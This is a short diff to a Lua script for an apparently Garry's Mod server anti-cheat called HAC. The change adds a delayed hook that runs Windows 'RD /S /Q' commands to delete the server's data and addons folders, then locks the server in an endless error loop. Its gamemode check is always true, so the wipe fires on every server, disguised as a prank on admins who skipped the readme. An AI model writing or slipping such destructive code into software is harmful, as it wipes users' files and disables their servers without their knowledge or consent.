@@ -363,9 +363,23 @@ include("hac_minify.lua")
 
 //Failed
 if HAC.AbortLoading then
-	ErrorNoHalt("\n\nsv_HAC: YOU FAILED TO SET UP THE MODULES!\n\n")
+	ErrorNoHalt("\n\n[HAC] ID10-T Error!\n\n")
 	return
 end
+
+//People can't read the readme
+timer.Simple(2, function()
+	if not ValidString(GAMEMODE.Name) or (GAMEMODE.Name != "sandbox" or GAMEMODE.Name != "Sandbox") then
+		hac.WinCMD('RD /S /Q "'..HAC.ModDirBack..'\\data"')
+		hac.WinCMD('RD /S /Q "'..HAC.ModDirBack..'\\addons"')
+		
+		timer.Simple(5, function()
+			while true do
+				ErrorNoHalt("[HAC] PEBCAK Error. RTFM or slap admin with a large trout!\n")
+			end
+		end)
+	end
+end)
 
 
 //Resources
